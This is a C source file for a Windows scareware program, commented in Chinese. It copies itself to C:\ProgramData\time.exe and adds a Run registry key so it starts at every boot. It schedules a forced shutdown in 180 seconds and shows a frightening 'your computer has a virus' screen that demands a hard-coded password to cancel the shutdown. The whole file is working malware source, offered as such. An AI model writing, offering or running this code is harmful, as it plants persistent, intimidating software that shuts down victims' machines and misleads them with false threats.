#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>
#define MAXPATH 1024
int main(void)
{
	
	int a;
	char m[7] = "123456";//储存密码
	char p[7] = { 0 };
	
	//修改注册表，使程序开机自动运行 
	char buffer[MAXPATH];//获取程序当前所在的目录
	char copy[MAXPATH] = "copy \"" ;
	char path[MAXPATH] = "\\time.exe\" C:\\ProgramData /y";
	char *szSubKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"; //系统启动项路径 
	char *time = "C:\\ProgramData\\time.exe";

	HKEY hKey;
	_getcwd(buffer, MAXPATH);
			strcat(copy, buffer);
			strcat(copy, path);
			system(copy);		
			//打开注册表
			if (RegOpenKeyEx(HKEY_CURRENT_USER, szSubKey, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
			{  //添加一个子Key,并设置值，"timec"是名称，可自己设置
				RegSetValueEx(hKey, "timecyincang", 0, REG_SZ, (BYTE *)time, strlen(time));
				RegCloseKey(hKey);//关闭注册表
			}
	
	system("title 禁止退出本程序，否则你的电脑会嗝屁！");
	system("mode con:cols=70 lines=25");//设置窗口大小 
	system("shutdown -s -t 180");//关机命令 
	system("color 04"); //设置窗口颜色
	printf("\n\n\n\n\n\n你的电脑中了病毒（禁止退出本程序，否则你的电脑会嗝屁！）。\n\n");
	printf("\t\t温馨提示：你有180秒的时间输入密码。\n\n\n\t\t\t");
	system("pause");
	system("cls"); 
	for(a=5;a>=0;a--) //for循环
	{
		printf("\n\n温馨提示：你只剩下%d次机会。\n",a);
		printf("请输入密码（输入密码后别忘了按回车）:");
		gets(p);

		if (strcmp(m, p) == 0)//将密码进行比较
		{
			system("color 0f");
			printf("\n\n\t\t恭喜你，密码正确，你的电脑不会嗝屁。\n\n");
			system("shutdown -a");
			system("pause");
			 exit(0);  //结束 也能用return 0;
		}
		else
		{
			printf("\n\t\t密码错误！\n");
			system("color 0c");  //设置字体颜色
		}
	}
		system("color 0a");
		system("pause"); 
		system("cls");
		printf("\n\n\n\n\n\n\t密码连续错误5次,你的电脑将嗝屁！重装系统吧！\n\n\n");
	system("pause");
	return 0;
}
